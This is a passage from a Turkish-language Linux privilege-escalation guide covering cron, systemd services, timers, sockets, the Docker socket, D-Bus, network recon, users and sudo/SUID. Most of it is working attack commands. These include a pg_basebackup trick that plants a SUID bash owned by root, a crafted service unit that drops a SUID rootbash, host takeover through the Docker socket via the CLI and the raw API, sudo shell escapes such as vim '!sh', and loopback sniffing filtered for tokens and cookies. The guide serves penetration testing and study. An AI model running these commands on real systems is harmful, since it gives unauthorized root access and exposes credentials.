- `openat()`: güvenilen bir dizin dosya tanıtıcısına göre işlem yapar.
- `mkstemp()`: geçici dosyaları güvenli izinlerle atomik olarak oluşturur.

### Yazılabilir payload'ları olan özel imzalı cron ikilileri
Root cron işi tarafından çalıştırılan ikili dosyanın tam olarak üzerine yazabilen sıradan bir kullanıcı, bir ayrıcalık sınırını aşabilir; ancak özel bir imza denetimi imzasız bir ikameyi reddedebilir. Belgelenen durumda, root'a ait ELF dosyası `0760` modundaydı; bu, grubundaki bir üyenin dosyaya yazmasına ve root sahibinin dosyayı çalıştırmasına izin veriyordu. Görünür bir süreç izlemesi, iş ikili dosyayı çalıştırmadan önce `objcopy`'nin `.text_sig` bölümünü çıkardığını gösteriyordu; doğrulayıcı betiğinin tamamı okunabilir değildi.<sup>[[2]](#references)</sup>

Başarılı olan ikame, bir ELF signer kullanılarak leak edilmiş özel imzalama materyaliyle imzalanmıştı. [Biçim belgeleri](https://github.com/NUAA-WatchDog/linux-elf-binary-signer), çalıştırılabilir dosyanın `.text` bölümünden türetilen bir imza bölümünü açıklıyor. Yalnızca `.text_sig` bölümüne bir sertifika veya eşleşen bir dize eklemenin, görünmeyen doğrulayıcıyı tatmin ettiği gösterilmemiştir. Yazılabilir imzalı bir ikilinin istismar edilebilir olduğu sonucuna varmadan önce gerçek zamanlanmış yolu, etkin yazma erişimini, root çağrısını ve doğrulayıcı politikasını kontrol edin. Tek başına bir `.text_sig` bölümü, yalnızca inceleme için bir ipucudur.

### Sık çalışan cron işleri

Her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri bulmak için süreçleri izleyebilirsiniz. Belki bundan yararlanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izleme yapmak**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu kullanabilirsiniz:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) kullanabilirsiniz (bu araç başlayan her süreci izler ve listeler).

### Saldırganın belirlediği mode bit’lerini koruyan root yedekleri (pg_basebackup)

Root tarafından sahiplenilen bir cron, yazma izniniz olan bir veritabanı dizininde `pg_basebackup` (veya herhangi bir özyinelemeli kopyalama işlemi) çalıştırıyorsa, **SUID/SGID binary** yerleştirerek bunun yedek çıktısına aynı mode bit’leriyle **root:root** olarak yeniden kopyalanmasını sağlayabilirsiniz.<sup>[[26]](#references)</sup>

Tipik keşif akışı (düşük yetkili bir DB kullanıcısı olarak):
- Her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komut çalıştıran root cron’u tespit etmek için `pspy` kullanın.
- Kaynak cluster’ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve iş tamamlandıktan sonra hedefin (`/opt/backups/current`) root’a ait olduğunu doğrulayın.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Bu, `pg_basebackup` küme kopyalanırken dosya izin bitlerini koruduğu için işe yarar; root tarafından çalıştırıldığında hedef dosyalar **root sahipliğini + saldırganın seçtiği SUID/SGID izinlerini** devralır. İzinleri koruyarak çalıştırılabilir bir konuma yazan benzer tüm ayrıcalıklı yedekleme/kopyalama rutinleri savunmasızdır.

### Görünmez cron işleri

Bir yorumdan sonra (yeni satır karakteri olmadan) **satır başı karakteri ekleyerek** bir cron işi oluşturmak mümkündür ve cron işi çalışır. Örnek (satır başı karakterine dikkat edin):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Bu tür gizli girdileri tespit etmek için, kontrol karakterlerini görünür kılan araçlarla cron dosyalarını inceleyin:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin. Yazabiliyorsanız, hizmet başlatıldığında, yeniden başlatıldığında veya durdurulduğunda (makinenin yeniden başlatılmasını beklemeniz gerekebilir) **backdoor'unuzu çalıştırması** için dosyayı **değiştirebilirsiniz**.\
Örneğin, backdoor'unuzu .service dosyasına **`ExecStart=/tmp/script.sh`** ile ekleyin.

### Yazılabilir hizmet binary dosyaları

Hizmetler tarafından çalıştırılan binary dosyalar üzerinde **yazma izinleriniz** varsa, bunları backdoor'larla değiştirebileceğinizi unutmayın. Böylece hizmetler yeniden çalıştırıldığında backdoor'lar da çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:

```bash
systemctl show-environment
```

Yol üzerindeki herhangi bir klasöre **yazabildiğinizi** fark ederseniz, **ayrıcalıkları yükseltebilirsiniz**. Şunlar gibi hizmet yapılandırma dosyalarında kullanılan göreli yolları aramalısınız:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ardından, yazabildiğiniz systemd PATH klasöründe göreli yolun ikili dosyasıyla **aynı ada sahip** bir **yürütülebilir dosya** oluşturun. Hizmetten güvenlik açığı bulunan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde **backdoor’unuz çalıştırılır** (yetkisiz kullanıcılar genellikle hizmetleri başlatamaz veya durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` komutuna bakın.**

## **Zamanlayıcılar**

**Zamanlayıcılar**, **.service** dosyalarını veya olayları kontrol eden ve adı `**.timer**` ile biten systemd unit dosyalarıdır. **Zamanlayıcılar**, takvim zamanı olayları ve monotonik zaman olayları için yerleşik desteğe sahip olduklarından cron'a alternatif olarak kullanılabilir ve eşzamansız çalıştırılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:

```bash
systemctl list-timers --all
```

### Yazılabilir zamanlayıcılar

Bir zamanlayıcıyı değiştirebiliyorsanız, ona bir `systemd.unit` örneğini (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.

```bash
Unit=backdoor.service
```

Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse bu değer, son eki hariç timer unit ile aynı ada sahip bir service varsayılanını kullanır. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adı için son ek dışında aynı adın kullanılması önerilir.

Dolayısıyla bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir binary çalıştıran** bir systemd unit (ör. `.service`) bulun
- **Göreli bir yol çalıştıran** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olduğunuz bir systemd unit bulun (bu executable'ı taklit etmek için)

**Timer'lar hakkında `man systemd.timer` komutuyla daha fazla bilgi edinin.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`timer`, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda ona işaret eden bir symlink oluşturularak **etkinleştirilir**.

## Sockets

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **process iletişimini** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılır.<sup>[[14]](#references)</sup>

Sockets, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Sockets hakkında daha fazla bilgi için `man systemd.socket` komutunu kullanın.** Bu dosyada birkaç ilgi çekici parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır; ancak özetle socket'in **nerede dinleme yapacağını belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.).
- `Accept`: Boolean bir argüman alır. **true** ise her gelen bağlantı için bir **service instance başlatılır** ve ona yalnızca bağlantı socket'i aktarılır. **false** ise dinleyen socket'lerin tümü **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Tek bir service unit'in tüm gelen trafiği koşulsuz olarak işlediği datagram socket'leri ve FIFO'lar için bu değer yok sayılır. **Varsayılanı false** değeridir. Performans nedenleriyle yeni daemon'ların yalnızca `Accept=no` ile çalışacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Dinleyen **socket'ler**/FIFO'lar sırasıyla oluşturulup bağlanmadan **önce** veya **sonra yürütülen** bir ya da daha fazla komut satırı alır. Komut satırının ilk token'ı mutlak bir dosya adı olmalı, ardından process için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Dinleyen **socket'ler**/FIFO'lar sırasıyla kapatılıp kaldırılmadan **önce** veya **sonra yürütülen** ek **komutlar**.
- `Service`: Gelen trafikle **etkinleştirilecek** **service** unit adını belirtir. Bu ayara yalnızca Accept=no olan socket'ler için izin verilir. Varsayılan olarak socket ile aynı ada sahip service kullanılır (sonek değiştirilir). Çoğu durumda bu seçeneği kullanmak gerekmez.

### Writable .socket files

**Yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz**; böylece backdoor, socket oluşturulmadan önce yürütülür. Bu nedenle **muhtemelen makine yeniden başlatılana kadar beklemeniz gerekir.**\
_Sistemin bu socket dosyası yapılandırmasını kullanıyor olması gerekir; aksi takdirde backdoor yürütülmez._

### Socket activation + writable unit path (create missing service)

Etkisi yüksek bir diğer yanlış yapılandırma örneği:

- `Accept=no` ve `Service=<name>.service` ayarlarına sahip bir socket unit
- Başvurulan service unit mevcut değil
- Saldırgan `/etc/systemd/system` dizinine (veya başka bir unit arama yoluna) yazabiliyor

Bu durumda saldırgan `<name>.service` oluşturabilir, ardından socket'e trafik göndererek systemd'nin yeni service'i root olarak yükleyip yürütmesini sağlayabilir.

Hızlı akış:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Yazılabilir socket'ler

**Yazılabilir bir socket tespit ederseniz** (_burada Unix Sockets'ten bahsediyoruz, config `.socket` dosyalarından değil_), bu socket ile **iletişim kurabilir** ve belki bir güvenlik açığından yararlanabilirsiniz.

### Unix Sockets'i listeleme

```bash
netstat -a -p --unix
```

### Ham bağlantı

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation example:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP soketleri

HTTP isteklerini dinleyen bazı **soketler** olabilir (_ burada .socket dosyalarından değil, Unix soketi gibi davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Socket **bir HTTP** isteğine yanıt veriyorsa onunla **iletişim kurabilir** ve belki de **bir güvenlik açığından yararlanabilirsiniz**.

### Yazılabilir Docker Socket'i

Genellikle `/var/run/docker.sock` konumunda bulunan Docker socket'i, güvenliği sağlanması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimine sahip olmak, ayrıcalık yükseltmeye yol açabilir. Bunun nasıl yapılabileceğini ve Docker CLI kullanılamıyorsa başvurulabilecek alternatif yöntemleri aşağıda bulabilirsiniz.

#### **Docker CLI ile Ayrıcalık Yükseltme**

Docker socket'ine yazma erişiminiz varsa aşağıdaki komutları kullanarak ayrıcalıklarınızı yükseltebilirsiniz:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Bu komutlar, ana makinenin dosya sistemine root düzeyinde erişimle bir container çalıştırmanıza olanak tanır.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI kullanılamadığında, Unix socket üzerinden ham HTTP kullanılarak Docker socket yine de kötüye kullanılabilir. En güvenilir yöntem şöyledir:

- ana makinenin root dizini bind-mounted olan, uzun süre çalışan bir yardımcı container oluşturun
- container'ı başlatın
- bu yardımcı container içinde bir `exec` örneği oluşturun
- `exec` örneğini başlatın ve çıktıyı API üzerinden geri okuyun

**Docker image'larını listeleme**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Bir yardımcı container oluşturun ve başlatın**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Bir exec örneği oluşturun**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance'ını başlatın ve çıktıyı okuyun**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Bu yaklaşım genellikle `attach` komutunu `socat` veya `nc -U` ile manuel olarak çalıştırmaya kıyasla daha dayanıklıdır. `/:/host` ile bir yardımcı oluşturabildiğinizde, `/host/root/...` gibi dosyaları okumak, `/host/root/.ssh` altına SSH keys eklemek veya host başlangıç dosyalarını değiştirmek için ek `exec` örnekleri kullanabilirsiniz.

### Diğerleri

`docker` grubunun **içinde olduğunuz için** docker socket üzerinde yazma izinleriniz varsa, [**yetkileri yükseltmenin daha fazla yolu vardır**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). [**docker API bir portta dinliyorsa**, onu da ele geçirebilirsiniz](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**Container'lardan kaçmanın veya container runtime'larını kötüye kullanarak yetkileri yükseltmenin** daha fazla yolunu şurada inceleyin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) ile yetki yükseltme

**`ctr`** komutunu kullanabildiğinizi fark ederseniz, **yetkileri yükseltmek için onu kötüye kullanabileceğinizden** aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ile yetki yükseltme

**`runc`** komutunu kullanabildiğinizi fark ederseniz, **yetkileri yükseltmek için onu kötüye kullanabileceğinizden** aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli biçimde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **süreçler arası iletişim (IPC) sistemidir**. Modern Linux sistemleri göz önünde bulundurularak tasarlanan D-Bus, farklı uygulama iletişimi türleri için sağlam bir çerçeve sunar.<sup>[[16]](#references)</sup>

Sistem çok yönlüdür; süreçler arasındaki veri alışverişini geliştiren ve **geliştirilmiş UNIX domain socket**'lerini andıran temel IPC'yi destekler. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, Bluetooth daemon'undan gelen bir çağrı sinyali müzik oynatıcının sesi kapatmasını sağlayarak kullanıcı deneyimini geliştirir. Bunun yanı sıra D-Bus, uzak nesne sistemi desteği sunarak uygulamalar arasındaki hizmet isteklerini ve yöntem çağrılarını basitleştirir ve geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) eşleşen policy kurallarının toplam etkisine göre yöneten bir **izin/verme modeli** kullanır. Bu policy'ler bus ile etkileşimleri belirler ve bu izinlerin kötüye kullanılması yoluyla yetki yükseltmeye olanak sağlayabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasındaki böyle bir policy örneği, root kullanıcısının `fi.w1.wpa_supplicant1` için sahip olma, mesaj gönderme ve mesaj alma izinlerini ayrıntılandırır.

Kullanıcı veya grup belirtilmeyen policy'ler genel olarak uygulanırken, "default" bağlamındaki policy'ler diğer belirli policy'lerin kapsamına girmeyen tüm durumlara uygulanır.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Bir D-Bus iletişimini nasıl keşfedip istismar edeceğinizi burada öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Makinenin ağdaki konumunu belirlemek için ağı keşfetmek her zaman ilgi çekicidir.

### Genel keşif

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Etkin bir `/etc/inetd.conf` girdisi GNU Inetutils `telnetd`'yi root olarak çalıştırıyorsa, yapılandırılmış ikili dosyanın sürümünü ve yerel dinleyiciyi, port yalnızca loopback'e bağlı olsa bile kontrol edin. GNU Inetutils 1.9.3 ile 2.7 sürümleri arasında, istemcinin gönderdiği `USER` değerinin `login -f`'ye iletildiği bir [telnet kimlik doğrulama atlatma](https://seclists.org/oss-sec/2026/q1/89) güvenlik açığı bulunuyordu (CVE-2026-24061). Bir süreç veya sürüm dizesi yalnızca bir göstergedir; sistemi açığa çıkmış saymadan önce tedarikçinin yama durumunu ve gerçek arka plan programını doğrulayın. [Telnet kılavuzunda](../../../network-services-pentesting/pentesting-telnet.md) daha fazla bilgi bulunur.

### Giden trafik filtrelemesi için hızlı ilk değerlendirme

Ana bilgisayar komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, taşıma katmanı, proxy ve rota filtrelemesini hızla birbirinden ayırın:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Açık portlar

Makineye erişmeden önce etkileşim kuramadığınız ağ hizmetlerini her zaman kontrol edin:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Listener'ları bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişime açık.
- `127.0.0.1` / `::1`: yalnızca yerel erişim (tünel/forward için iyi adaylar).
- Belirli dahili IP'ler (örn. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel servisler için triyaj iş akışı

Bir host'u ele geçirdiğinizde, `127.0.0.1` adresine bind edilmiş servisler çoğu zaman ilk kez shell'inizden erişilebilir hâle gelir. Hızlı bir yerel iş akışı şöyledir:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### Ağ tarayıcısı olarak LinPEAS (yalnızca ağ modu)

Yerel PE kontrollerinin yanı sıra linPEAS, odaklı bir ağ tarayıcısı olarak çalışabilir. `$PATH` içindeki kullanılabilir ikili dosyaları (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve araç yüklemez.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` olmadan `-d`, `-p` veya `-i` belirtirseniz linPEAS, saf bir network scanner gibi davranır (privilege-escalation kontrollerinin geri kalanını atlar).

### Sniffing

Trafiği sniff edip edemediğinizi kontrol edin. Edebilirseniz bazı kimlik bilgilerini yakalayabilirsiniz.

```
timeout 1 tcpdump
```

Hızlı pratik kontroller:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`), post-exploitation sırasında özellikle değerlidir; çünkü yalnızca dahili erişime açık birçok servis burada token/cookie/kimlik bilgilerini açığa çıkarır:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Şimdi yakala, sonra ayrıştır:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Kullanıcılar

### Generic Enumeration

Kim olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **oturum açabildiğini** ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıklarını yükseltmesine olanak tanıyan bir hatadan etkilenmiştir. Daha fazla bilgi: [burada](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [burada](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [burada](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Şu komutla istismar edin**: **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları sağlayabilecek bir **grubun üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Şifre Politikası

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bilinen parolalar

Ortamda **herhangi bir parolayı biliyorsanız**, bu parolayı kullanarak **her kullanıcı olarak oturum açmayı deneyin**.

### Su Brute

Çok fazla gürültü çıkarmayı sorun etmiyorsanız ve bilgisayarda `su` ile `timeout` ikili dosyaları varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcılar üzerinde brute-force deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), `-a` parametresiyle kullanıcılar üzerinde brute-force denemesi de yapar.

## Yazılabilir PATH kötüye kullanımları

### $PATH

**$PATH içindeki bir klasöre yazabildiğinizi** fark ederseniz, yazılabilir klasörün içine farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla bir **backdoor oluşturarak** ayrıcalıklarınızı yükseltebilirsiniz. Bu komut, $PATH içinde yazılabilir klasörünüzden önce gelen bir klasörden **yüklenmemelidir**.

### SUDO ve SUID

`sudo` kullanarak bazı komutları çalıştırmanıza izin verilebilir veya bu komutlarda suid biti bulunabilir. Şununla kontrol edin:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza olanak tanır**.<sup>[[8]](#references)</sup> Örneğin:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Bu örnekte `demo` kullanıcısı `vim`'i `root` olarak çalıştırabilir; root dizinine bir ssh anahtarı ekleyerek veya `sh` çağırarak shell elde etmek artık çok kolaydır.

```
sudo vim -c '!sh'
```

### sudo scriptindeki tırnak içine alınmamış Bash karşılaştırması

Bash'te `[[ "$protected" == $candidate ]]` ifadesinin sağ tarafı bir pattern'dir. Root yetkisiyle çalışabilen bir sudo script'i `candidate` değerini çağıranın kontrolündeki bir dosyadan alıyorsa, `prefix*` gibi bir değer korunan bir dizenin başlangıcıyla eşleşebilir. Farklı başarı ve hata yolları böylece bir prefix oracle açığa çıkarabilir. Amaç tam eşleşmeyse sağ tarafı tırnak içine alın (`[[ "$protected" == "$candidate" ]]`). Tırnak içine alınmamış bir karşılaştırmayı istismar edilebilir saymadan önce gerçek sudo argümanlarını, girdinin kaynağını ve gözlemlenebilir dallanma davranışını inceleyin. [GNU Bash kılavuzu](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) bu pattern davranışını tanımlar.

### sudo altında PrusaSlicer proje dosyaları

